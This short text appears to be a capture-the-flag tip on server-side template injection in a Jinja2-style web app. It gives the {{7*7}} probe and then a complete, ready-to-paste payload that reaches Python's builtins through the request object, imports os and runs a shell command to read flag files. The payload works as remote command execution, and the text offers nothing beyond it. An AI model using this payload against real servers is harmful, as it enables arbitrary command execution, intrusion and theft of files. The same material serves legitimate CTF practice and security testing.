**Testing for SSTI**
write :  {{7*7}}  then submit!
when return 49 means it accept your request!

So write again : {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat flag*')|attr('read')()}}


